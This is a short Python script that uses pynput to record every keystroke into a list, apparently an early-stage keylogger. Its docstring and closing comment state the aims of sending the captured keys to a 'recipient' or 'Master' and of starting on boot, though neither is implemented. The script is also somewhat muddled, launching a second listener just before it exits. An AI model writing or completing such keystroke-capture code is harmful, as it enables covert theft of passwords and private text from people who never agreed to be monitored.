
import pynput

"""

Keylistener ,appending keys to array and then sending array content to
recipient,
Missing on start-up start collecting keys pressed

"""
Key_Array=[]


def pressed(key):
	try:
		print('< {0} >'.format(key))
		Key_Array.append(key)
	except AttributeError:
		print('< {0} >'.format(key))	
		Key_Array.append(key)

def on_release(key):
    print('</ {0} >'.format(key),Key_Array)
    if key == pynput.keyboard.Key.esc:
        # Stop listener
        return False	
	

# Collect events until released
with pynput.keyboard.Listener(on_press=pressed, on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = pynput.keyboard.Listener(on_press=pressed,on_release=on_release)
listener.start()		

Key_Array.append("END")
print(Key_Array)

#Send Keys to Master